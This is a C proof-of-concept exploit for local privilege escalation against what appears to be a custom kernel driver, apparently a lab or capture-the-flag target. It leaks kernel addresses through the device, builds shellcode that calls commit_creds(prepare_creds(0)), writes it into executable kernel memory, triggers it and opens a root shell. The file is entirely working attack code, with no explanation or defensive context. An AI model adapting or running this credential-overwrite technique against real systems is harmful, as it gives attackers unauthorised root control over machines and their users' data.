/* POC to exploit arbitrary read and
 * arbitrary shell code to gain local priv esc.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>

#include <kacmd.h>
#include <exp_commons.h>

#define KERNEL_CREDS 0xab7a0
#define COMMIT_CREDS 0xab3f0

int main(){
    struct kacmd_info_params kip;
    struct kacmd_info_resp kir;
    struct kacmd_call_params kcp;
    unsigned char* shellcode;
    unsigned long prepare_creds;
    unsigned long commit_creds;
    size_t length;
    char code[1024];
    int pid = getpid(); 
    int kpid;
    kip.cmd = KACMD_INFO;

    init();

    write_dev(cmd, (char*)&kip, sizeof(kip), 0);
    read_dev(cmd, (char*)&kir, sizeof(kir), 0);
    printf("[I] Vpg: %p Ppg: %p Epg: %p\n", kir.pg_vaddress, kir.pg_paddress, kir.exec_paddress);
    printf("[I] code: %p data: %p bss: %p\n", kir.kernel_code, kir.kernel_data, kir.kernel_bss);
    prepare_creds = (unsigned long)kir.kernel_code + KERNEL_CREDS;
    commit_creds = (unsigned long)kir.kernel_code + COMMIT_CREDS;
    snprintf(code,
            sizeof(code),
            "push rbx; xor rdi, rdi; mov rbx, 0x%lx; call rbx; mov rdi, rax; mov rbx, 0x%lx; call rbx; pop rbx; ret",
            prepare_creds,
            commit_creds);
    printf("[I] Compiling:\n\t%s\n",code);
    shellcode = assemble(code, &length);
    write_dev(vmem, shellcode, length, (unsigned long)kir.exec_paddress);

    kcp.cmd = KACMD_CALL_SIMPLE;
    kcp.address = kir.exec_paddress;
    write_dev(cmd, (char*)&kcp, sizeof(kcp), 0);

    system("/bin/sh");
    
    fini();
}
